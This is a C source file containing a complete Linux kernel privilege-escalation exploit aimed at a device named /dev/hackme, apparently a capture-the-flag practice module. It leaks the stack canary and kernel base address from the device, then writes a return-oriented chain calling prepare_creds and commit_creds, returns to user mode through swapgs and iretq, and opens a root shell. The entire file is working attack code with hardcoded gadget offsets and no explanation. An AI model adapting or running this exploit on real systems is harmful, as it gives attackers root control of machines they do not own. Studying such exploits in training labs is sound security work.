#include <fcntl.h>
#include <locale.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
#include <wchar.h>


#define PATH "/dev/hackme"
#define MAX_SIZE 0x198

typedef unsigned char uchar;

// Prototypes
void print_content(u_int64_t ptr[], int size);
void save_status();
u_int64_t rebase(u_int64_t off);
void get_shell();

// Gadgets
//
u_int64_t prepare_creds_off = 0x4c67f0,
          commit_creds_off = 0x4c6410,
          pop_rdi_ret = 0x6370,               // pop rdi; ret;
          pop_rax = 0x4d11,                   // pop rax; ret;
          swapgs_pop_regs_iretq = 0x200f23,   // pop 5 regs; swapgs; iretq;
          //swapgs_pop_rbp = 0xa55f,            // swapgs; pop rbp; ret;
          //iretq = 0xc0d9,                     // iretq;
          test_al_1 = 0xa7ea8e,               // test al, 1; ret;
          push_rax_pop_rbx_rbp = 0x4d5920,    // push rax; pop rbx; pop rbp; ret;
          mov_rdi_rbx_pop_rbx_rbp = 0x4ee48e  // mov rdi, rbx; jne 0x6ee483; pop rbx; pop rbp; ret;
          // mov_rdi_rbx_pop_rbx_rbp = 0x4ee48b  // mov rdi, rbx; jne 0x6ee483; pop rbx; pop rbp; ret;
          ;

// Global variables
u_int64_t leak[MAX_SIZE], rop[MAX_SIZE], base_address = 0, mmap_addr; 
void *mapped;
size_t user_cs, user_ss, user_rflags, user_sp, user_rip = (size_t) get_shell;
const char cat[] = {0xf0, 0x9f, 0x90, 0x88, '\0'};

int main(int argc, char **argv) {
    save_status();
    printf("[!] user_rflags:        %#016lx\n", user_rflags);
    printf("[!] user_sp:            %#016lx\n", user_sp);
    printf("[!] user_cs:            %#016lx\n", user_cs);
    printf("[!] user_ss:            %#016lx\n", user_ss);
    printf("[!] user_rip:           %#016lx\n", user_rip);
    printf("\n------------------------------  leak  ----------------------------\n\n");

    int fd, r_bytes, i;
    u_int64_t canary, ret;

    fd = open(PATH, O_RDWR);
    if (fd < 0) {
        perror("open()");
        exit(-1);
    }

    r_bytes = read(fd, leak, MAX_SIZE);
    if (r_bytes < MAX_SIZE) {
        perror("read()");
    }
    print_content(leak, MAX_SIZE);

    canary = leak[16];
    ret = leak[20];
    base_address = leak[38] & 0xffffffffff000000;
    printf("\n\n");
    printf("[*] canary:           %#016lx\n", canary);
    printf("[*] ret address:      %#016lx\n", ret);
    printf("[*] base address:     %#016lx\n", base_address);

    printf("[!] time to rop\n");

    for (i = 0; i < 16; i++) {
        rop[i] = 0xdeadbeefdeadbeef;
    }
    // index 16 goes canary
    rop[i++] = canary;
    rop[i++] = 0xdeadbeefdeadbeef;
    rop[i++] = 0xdeadbeefdeadbeef;
    rop[i++] = 0xdeadbeefdeadbeef;
    // index 20 goes first gadget
    rop[i++] = rebase(pop_rdi_ret);
    rop[i++] = 0;
    rop[i++] = rebase(prepare_creds_off);
    rop[i++] = rebase(push_rax_pop_rbx_rbp);
    rop[i++] = 0xdeadbeefdeadbeef;              // rbp
    rop[i++] = rebase(pop_rax);
    rop[i++] = 0; // Set ZF to 0 only if al == 0
    rop[i++] = rebase(test_al_1);
    rop[i++] = rebase(mov_rdi_rbx_pop_rbx_rbp);
    rop[i++] = 0xdeadbeefdeadbeef;              // rbx
    rop[i++] = 0xdeadbeefdeadbeef;              // rbp
    rop[i++] = rebase(commit_creds_off);
    rop[i++] = rebase(swapgs_pop_regs_iretq);
    rop[i++] = 0xdeadbeefdeadbeef;              // rbp
    rop[i++] = 0xdeadbeefdeadbeef;              // rbp
    rop[i++] = 0xdeadbeefdeadbeef;              // rbp
    rop[i++] = 0xdeadbeefdeadbeef;              // rbp
    rop[i++] = 0xdeadbeefdeadbeef;              // rbp
    rop[i++] = user_rip;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd, rop, MAX_SIZE);

    return 0;
}

u_int64_t rebase(u_int64_t off) {
    return off + base_address;
} 

void get_shell() {
    printf("[#] spawn shell %s %s %s %s\n", cat, cat, cat, cat);
    system("/bin/sh");
    return;
}

void save_status() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3;\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
        :
        : "memory");
    puts("[*] status has been saved.");
}

void print_content(u_int64_t ptr[], int size) {
    for (int i = 0; i < size / 8; i++) {
        printf("0x%016lx\t", ptr[i]);
        if (!((i + 1) % 3)) {
            printf("\n");
        } 
    }
}
